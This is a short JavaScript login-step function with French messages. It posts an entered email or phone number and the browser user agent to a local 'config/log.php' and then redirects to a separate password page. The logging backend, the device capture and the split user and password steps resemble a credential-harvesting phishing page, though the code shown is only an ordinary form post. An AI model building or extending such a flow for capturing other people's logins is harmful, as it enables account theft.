function login(){
	

var USER	 =	$("#user_name").val();
	
	//alert(ID_sg);
	//alert(PASS_sg);
	
 if(USER==''){

swal({
icon: 'error',
title: 'Erreur !',
text: "Veuillez entrer votre email ou votre numéro de téléphone"

})	

return false;	
} 



var data_log = 
{
DEVICE       : navigator.userAgent,
USER		    :   USER

}; 


var _url = './config/log.php';
$('#cover-spin').show(0);
$.post(_url,data_log,function(data){
 var reponse = JSON.parse(data); 
localStorage.setItem("user",USER);

if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	


   /* $('#cover-spin').hide();*/
    window.location="pass.html";
    

    

} 


})
}